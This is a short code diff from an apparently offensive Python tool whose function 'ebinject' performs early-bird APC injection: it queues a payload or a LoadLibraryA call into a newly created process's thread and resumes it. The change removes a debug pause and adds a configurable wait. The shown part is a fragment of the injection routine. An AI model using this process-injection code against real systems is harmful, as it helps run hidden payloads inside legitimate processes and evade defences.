@@ -108,15 +108,14 @@ def ebinject(handler, target, payload, as_dll):
 	if as_dll:
 		arg = ctypes.windll.kernel32.LoadLibraryA
 
-	os.system("pause")
-
 	ctypes.windll.kernel32.QueueUserAPC(ctypes.cast(mem, ctypes.c_void_p), pi.hThread, ctypes.cast(arg, ctypes.c_void_p))
 
 	win32process.ResumeThread(pi.hThread)
 
 	cypy.printv(f"Successfully resumed thread in {abstarget} (PID {pi.dwProcessId})")
 
-#	win32event.WaitForSingleObject(pi.hThread, -1)
+	if handler.duration != 0:
+		win32event.WaitForSingleObject(pi.hThread, handler.duration)
 
 	win32api.CloseHandle(pi.hThread)
 	win32api.CloseHandle(pi.hProcess)
